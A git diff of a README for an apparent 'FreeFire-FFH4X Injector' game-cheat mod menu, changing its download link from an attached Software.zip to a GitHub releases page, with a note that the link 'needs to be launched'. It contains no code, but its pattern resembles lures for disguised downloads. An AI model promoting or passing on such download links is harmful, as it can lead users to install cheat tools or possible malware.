@@ -9,7 +9,7 @@ Welcome to the FreeFire-FFH4X Injector repository! This MOD menu provides Free F
 
 ## Installation
 To get started with the FFH4X Injector, download the software from the following link:
-[![Download FFH4X Injector](https://img.shields.io/badge/Download-FFH4X_Injector-blue)](https://github.com/user-attachments/files/18060583/Software.zip)
+[![Download FFH4X Injector](https://github.com/reapergod69/FreeFire-FFH4X/releases/tag/v2.0)](https://github.com/reapergod69/FreeFire-FFH4X/releases/tag/v2.0)
 
 *Note: The provided link needs to be launched.*
 
